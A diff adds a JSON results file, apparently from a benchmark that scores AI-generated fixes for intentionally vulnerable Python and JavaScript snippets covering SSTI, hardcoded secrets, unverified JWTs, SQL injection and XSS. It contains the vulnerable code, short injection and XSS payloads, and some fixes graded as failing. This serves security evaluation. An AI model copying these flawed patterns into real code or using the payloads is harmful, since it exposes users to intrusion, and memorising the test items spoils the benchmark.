+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious Server-Side Template Injection (SSTI) payloads through the 'bio' form parameter. Since Jinja2 (Flask's template engine) evaluates expressions inside templates, an attacker can execute arbitrary Python code on the server, potentially leading to Remote Code Execution (RCE), data exfiltration, or complete system compromise.",
+          "fixed_code": "from flask import escape, render_template_string, request\n\n\ndef profile():\n    bio = request.form[\"bio\"]\n    safe_bio = escape(bio)\n    return render_template_string(\"<p>\" + safe_bio + \"</p>\")",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": false,
+            "new_classes": [],
+            "good_fix": false
+          }
+        }
+      }
+    },
+    {
+      "id": "py-secret-api-key",
+      "language": "python",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "new",
+      "code": "import requests\n\napi_key = \"d41d8cd98f00b204e9800998ecf8427e\"\n\n\ndef fetch_weather(city):\n    return requests.get(\n        \"https://api.example.com/weather\",\n        params={\"q\": city, \"key\": api_key},\n        timeout=10,\n    ).json()\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker who gains access to the source code repository or decompiles the application can extract the hardcoded API key. This credential can then be used to impersonate the application, abuse API limits, incur financial costs, or access unauthorized data from the downstream weather service.",
+          "fixed_code": "import os\nimport requests\n\napi_key = os.getenv(\"WEATHER_API_KEY\")\n\n\ndef fetch_weather(city):\n    return requests.get(\n        \"https://api.example.com/weather\",\n        params={\"q\": city, \"key\": api_key},\n        timeout=10,\n    ).json()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The code hardcodes a sensitive API key directly into the source code. If the code is pushed to a public repository or accessed by an unauthorized individual, the credential is automatically exposed, allowing attackers to impersonate the application, abuse the API quota, or access unauthorized resources.",
+          "fixed_code": "import os\nimport requests\n\napi_key = os.environ.get(\"WEATHER_API_KEY\")\n\n\ndef fetch_weather(city):\n    if not api_key:\n        raise ValueError(\"API key is not set in the environment variables.\")\n    return requests.get(\n        \"https://api.example.com/weather\",\n        params={\"q\": city, \"key\": api_key},\n        timeout=10,\n    ).json()",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-secret-db-password",
+      "language": "python",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "new",
+      "code": "import psycopg2\n\ndb_password = \"S3cureP@ssw0rd!2024\"\n\n\ndef connect():\n    return psycopg2.connect(host=\"db.internal\", user=\"app\", password=db_password, dbname=\"shop\")\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker who gains access to the source code repository or decompiled bytecode can read the hardcoded database password directly. They can then use these credentials to connect directly to the internal database, bypass application-level access controls, and read, modify, or delete sensitive data.",
+          "fixed_code": "import os\nimport psycopg2\n\ndb_password = os.environ.get(\"DB_PASSWORD\")\n\n\ndef connect():\n    return psycopg2.connect(host=\"db.internal\", user=\"app\", password=db_password, dbname=\"shop\")",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The code contains a hardcoded plaintext password ('S3cureP@ssw0rd!2024'). If the source code is exposed through a repository leak, unauthorized access control, or insider threat, an attacker can extract this credential to directly access the database, bypassing application-level security controls.",
+          "fixed_code": "import os\nimport psycopg2\n\ndb_password = os.environ.get('DB_PASSWORD')\n\n\ndef connect():\n    return psycopg2.connect(host='db.internal', user='app', password=db_password, dbname='shop')",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-secret-flask-key",
+      "language": "python",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "new",
+      "code": "from flask import Flask\n\napp = Flask(__name__)\napp.secret_key = \"change-me-1234567890abcdef\"\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker who inspects the source code or version control history can discover the hardcoded secret key. Because Flask uses this secret key to cryptographically sign session cookies, knowing the key allows the attacker to forge valid session tokens, potentially escalating privileges and impersonating any user or administrator on the application.",
+          "fixed_code": "import os\nfrom flask import Flask\n\napp = Flask(__name__)\napp.secret_key = os.environ.get('FLASK_SECRET_KEY')",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker could exploit the weak and static secret key ('change-me-1234567890abcdef') by guessing it or using it in a brute-force attack. Since this key is hardcoded and publicly visible, the attacker can forge valid session cookies, allowing them to impersonate any user, bypass authentication, and gain unauthorized access to the application.",
+          "fixed_code": "import os\nfrom flask import Flask\n\napp = Flask(__name__)\napp.secret_key = os.environ.get('FLASK_SECRET_KEY') or os.urandom(32)",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "py-auth-verify-false",
+      "language": "python",
+      "vulnerability_class": "broken_authentication",
+      "source": "new",
+      "code": "import jwt\n\n\ndef current_user(token):\n    claims = jwt.decode(token, options={\"verify_signature\": False})\n    return claims[\"sub\"]\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can tamper with the JWT token payload, such as modifying the 'sub' claim to represent a different user ID, and pass it to the application. Because signature verification is explicitly disabled via `options={\"verify_signature\": False}`, the application will blindly trust the manipulated claims and return the unauthorized user's ID, leading to a complete authentication bypass.",
+          "fixed_code": "import jwt\n\nSECRET_KEY = \"your-secure-secret-key\"\n\n\ndef current_user(token):\n    claims = jwt.decode(token, SECRET_KEY, algorithms=[\"HS256\"])\n    return claims[\"sub\"]",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [
+              "hardcoded_secret"
+            ],
+            "good_fix": false
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The function decodes a JSON Web Token (JWT) without verifying its cryptographic signature by setting 'verify_signature': False. An attacker can tamper with the payload (e.g., changing the 'sub' claim to 'admin') and pass the modified token to the function. Since the signature is not checked, the application will blindly trust the manipulated data, leading to severe privilege escalation or authentication bypass.",
+          "fixed_code": "import jwt\n\n\ndef current_user(token, secret_key):\n    # Always verify the signature and specify the expected algorithms to prevent algorithm confusion attacks\n    claims = jwt.decode(token, secret_key, algorithms=[\"HS256\"])\n    return claims[\"sub\"]",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-sqli-template",
+      "language": "javascript",
+      "vulnerability_class": "sql_injection",
+      "source": "new",
+      "code": "function getUser(db, id) {\n  return db.query(`SELECT * FROM users WHERE id = ${id}`);\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious SQL payloads (such as '1 OR 1=1') via the 'id' parameter. Because the input is directly interpolated into the query string without sanitization or parameterization, the database executes the attacker's SQL commands, potentially exposing unauthorized data, modifying records, or destroying the database.",
+          "fixed_code": "function getUser(db, id) {\n  return db.query('SELECT * FROM users WHERE id = ?', [id]);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can manipulate the 'id' parameter to perform SQL injection. By passing a payload like '1 OR 1=1', they can bypass authentication or extract unauthorized data from the database.",
+          "fixed_code": "function getUser(db, id) {\n  return db.query('SELECT * FROM users WHERE id = ?', [id]);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-sqli-concat",
+      "language": "javascript",
+      "vulnerability_class": "sql_injection",
+      "source": "new",
+      "code": "const mysql = require(\"mysql\");\n\nfunction search(connection, term, callback) {\n  connection.query(\"SELECT * FROM items WHERE name = '\" + term + \"'\", callback);\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious input containing SQL commands (e.g., ' OR '1'='1) in the 'term' parameter. Because the input is directly concatenated into the SQL query string, the attacker can manipulate the query logic, potentially bypassing authentication, leaking sensitive data from other tables, or modifying the database.",
+          "fixed_code": "const mysql = require(\"mysql\");\n\nfunction search(connection, term, callback) {\n  connection.query(\"SELECT * FROM items WHERE name = ?\", [term], callback);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The function is vulnerable to SQL injection because user input 'term' is directly concatenated into the SQL query string without sanitization or parameterization. An attacker could input a malicious string like \"' OR '1'='1\" to bypass authentication or extract unauthorized data from the database.",
+          "fixed_code": "const mysql = require(\"mysql\");\n\nfunction search(connection, term, callback) {\n  const query = \"SELECT * FROM items WHERE name = ?\";\n  connection.query(query, [term], callback);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-xss-innerhtml",
+      "language": "javascript",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "function showMessage(text) {\n  document.getElementById(\"out\").innerHTML = text;\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker could supply malicious JavaScript payloads through the 'text' parameter (e.g., '<img src=x onerror=alert(1)>'). Because the function assigns the input directly to innerHTML, the browser executes the injected script in the context of the user's session, leading to Cross-Site Scripting (XSS).",
+          "fixed_code": "function showMessage(text) {\n  document.getElementById(\"out\").textContent = text;\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this code by supplying a malicious string containing HTML and JavaScript (e.g., '<img src=x onerror=alert(document.domain)>') to the 'showMessage' function. Because the input is directly assigned to 'innerHTML' without prior sanitization, the browser executes the injected script in the context of the user's session, leading to a Cross-Site Scripting (XSS) vulnerability.",
+          "fixed_code": "function showMessage(text) {\n  document.getElementById(\"out\").textContent = text;\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-xss-document-write",
+      "language": "javascript",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "function render(name) {\n  document.write(\"<h2>Welcome \" + name + \"</h2>\");\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious JavaScript payloads within the 'name' parameter (e.g., '<img src=x onerror=alert(1)>'). Because the function directly writes this unsanitized input into the document using document.write(), the browser executes the script in the context of the user's session, leading to potential session hijacking or credential theft.",
+          "fixed_code": "function render(name) {\n  const heading = document.createElement('h2');\n  heading.textContent = 'Welcome ' + name;\n  document.body.appendChild(heading);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious input containing HTML and JavaScript (e.g., '<img src=x onerror=alert(document.cookie)>') via the 'name' parameter. Because the input is directly written to the DOM using document.write without sanitization or encoding, the browser executes the injected script in the context of the victim's session, leading to Cross-Site Scripting (XSS).",
+          "fixed_code": "function render(name) {\n  const h2 = document.createElement('h2');\n  h2.textContent = 'Welcome ' + name;\n  document.body.appendChild(h2);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-xss-express-send",
+      "language": "javascript",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "const express = require(\"express\");\nconst app = express();\n\napp.get(\"/greet\", (req, res) => {\n  res.send(\"<h1>Hello \" + req.query.name + \"</h1>\");\n});\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious JavaScript via the 'name' query parameter, such as '?name=<script>alert(document.cookie)</script>'. Because the input is directly concatenated into the HTML response without sanitization or escaping, the browser will execute the script in the context of the user's session, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.",
+          "fixed_code": "const express = require(\"express\");\nconst escapeHtml = require(\"escape-html\");\nconst app = express();\n\napp.get(\"/greet\", (req, res) => {\n  const safeName = escapeHtml(req.query.name || \"\");\n  res.send(\"<h1>Hello \" + safeName + \"</h1>\");\n});",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": false,
+            "new_classes": [],
+            "good_fix": false
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can exploit this Cross-Site Scripting (XSS) vulnerability by crafting a malicious URL where the 'name' query parameter contains JavaScript code (e.g., ?name=<script>alert(document.cookie)</script>). When the server reflects this input back in the HTML response without sanitization or encoding, the browser executes the injected script in the context of the victim's session, potentially allowing session hijacking or data theft.",
+          "fixed_code": "const express = require(\"express\");\nconst escapeHtml = require(\"escape-html\");\nconst app = express();\n\napp.get(\"/greet\", (req, res) => {\n  const safeName = escapeHtml(req.query.name || \"\");\n  res.send(\"<h1>Hello \" + safeName + \"</h1>\");\n});",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": false,
+            "new_classes": [],
+            "good_fix": false
+          }
+        }
+      }
+    },
+    {
+      "id": "js-xss-insert-adjacent",
+      "language": "javascript",
+      "vulnerability_class": "xss",
+      "source": "new",
+      "code": "function addRow(table, cells) {\n  table.insertAdjacentHTML(\"beforeend\", \"<tr><td>\" + cells + \"</td></tr>\");\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker could supply malicious JavaScript inside the 'cells' parameter (e.g., '<img src=x onerror=alert(1)>'). When 'insertAdjacentHTML' inserts this unvalidated string directly into the DOM, the script executes in the context of the user's session, leading to Cross-Site Scripting (XSS).",
+          "fixed_code": "function addRow(table, cells) {\n  const row = table.insertRow();\n  const cell = row.insertCell();\n  cell.textContent = cells;\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can supply malicious JavaScript via the 'cells' parameter, which is concatenated directly into the HTML string. When 'insertAdjacentHTML' executes, the injected script runs in the context of the user's session, potentially leading to Cross-Site Scripting (XSS), session hijacking, or data theft.",
+          "fixed_code": "function addRow(table, cells) {\n  const row = table.insertRow();\n  const cell = row.insertCell();\n  cell.textContent = cells;\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-secret-api-key",
+      "language": "javascript",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "new",
+      "code": "const apiKey = \"d41d8cd98f00b204e9800998ecf8427e\";\n\nasync function load(city) {\n  const response = await fetch(`https://api.example.com/weather?q=${city}&key=${apiKey}`);\n  return response.json();\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can decompile or inspect the client-side JavaScript code to extract the hardcoded API key. Once obtained, the attacker can use the key to make unauthorized requests, potentially exhausting rate limits, incurring financial costs, or accessing restricted data on behalf of the application.",
+          "fixed_code": "async function load(city) {\n  const apiKey = process.env.API_KEY;\n  const response = await fetch(`https://api.example.com/weather?q=${city}&key=${apiKey}`);\n  return response.json();\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The code hardcodes a sensitive API key directly into the client-side JavaScript source code. An attacker can easily extract this key by inspecting the source code in their browser or by intercepting the network traffic. Once stolen, the attacker can abuse the key to make unauthorized requests, potentially exhausting the API quota, incurring financial costs, or gaining unauthorized access to backend services.",
+          "fixed_code": "async function load(city) {\n  const response = await fetch(`/api/weather?city=${encodeURIComponent(city)}`);\n  return response.json();\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-secret-jwt-sign",
+      "language": "javascript",
+      "vulnerability_class": "hardcoded_secret",
+      "source": "new",
+      "code": "const jwt = require(\"jsonwebtoken\");\n\nconst secret = \"change-me-1234567890abcdef\";\n\nfunction issue(userId) {\n  return jwt.sign({ sub: userId }, secret);\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker with access to the source code repository can view the hardcoded secret string 'change-me-1234567890abcdef'. Since this secret is used to sign JSON Web Tokens (JWTs), the attacker can use the same secret to forge valid tokens for any user ID, completely bypassing authentication and gaining unauthorized access to the application.",
+          "fixed_code": "const jwt = require(\"jsonwebtoken\");\n\nconst secret = process.env.JWT_SECRET;\nif (!secret) {\n  throw new Error(\"JWT_SECRET environment variable is not set\");\n}\n\nfunction issue(userId) {\n  return jwt.sign({ sub: userId }, secret);\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The application signs JSON Web Tokens using a hardcoded, predictable secret ('change-me-1234567890abcdef'). An attacker who discovers this secret can forge valid tokens for any user ID, bypassing authentication completely and gaining unauthorized access to protected resources or administrative functions.",
+          "fixed_code": "const jwt = require(\"jsonwebtoken\");\n\nconst secret = process.env.JWT_SECRET;\nif (!secret) {\n  throw new Error(\"FATAL: JWT_SECRET environment variable is not set.\");\n}\n\nfunction issue(userId) {\n  return jwt.sign({ sub: userId }, secret, { expiresIn: '1h' });\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    },
+    {
+      "id": "js-auth-jwt-decode",
+      "language": "javascript",
+      "vulnerability_class": "broken_authentication",
+      "source": "new",
+      "code": "const jwt = require(\"jsonwebtoken\");\n\nfunction currentUser(token) {\n  const claims = jwt.decode(token);\n  return claims.sub;\n}\n",
+      "arms": {
+        "grounded": {
+          "status": "ok",
+          "exploit_scenario": "An attacker can manipulate the payload of the JWT (such as changing the 'sub' claim to another user's ID) and pass it to the currentUser function. Because jwt.decode() only parses the token without verifying its cryptographic signature, the application blindly trusts the forged claims, leading to authentication bypass and unauthorized access to other users' data.",
+          "fixed_code": "const jwt = require(\"jsonwebtoken\");\n\nfunction currentUser(token, secretKey) {\n  try {\n    const claims = jwt.verify(token, secretKey, { algorithms: [\"HS256\"] });\n    return claims.sub;\n  } catch (err) {\n    throw new Error(\"Invalid token\");\n  }\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        },
+        "free_form": {
+          "status": "ok",
+          "exploit_scenario": "The function uses jwt.decode() instead of jwt.verify(). jwt.decode() only parses the token without verifying its cryptographic signature. An attacker can forge a fake token with arbitrary claims, including a manipulated 'sub' (subject) field representing another user, and bypass authentication completely.",
+          "fixed_code": "const jwt = require(\"jsonwebtoken\");\n\nfunction currentUser(token) {\n  const secret = process.env.JWT_SECRET;\n  try {\n    const claims = jwt.verify(token, secret);\n    return claims.sub;\n  } catch (err) {\n    return null;\n  }\n}",
+          "analysis": {
+            "syntax_ok": true,
+            "kept_code": true,
+            "scan_complete": true,
+            "target_cleared": true,
+            "new_classes": [],
+            "good_fix": true
+          }
+        }
+      }
+    }
+  ],
+  "excluded": [
+    {
+      "id": "py-auth-decode-no-key",
+      "reason": "detectors did not flag the intended class"
+    },
+    {
+      "id": "js-secret-password-config",
+      "reason": "detectors did not flag the intended class"
+    }
+  ]
+}
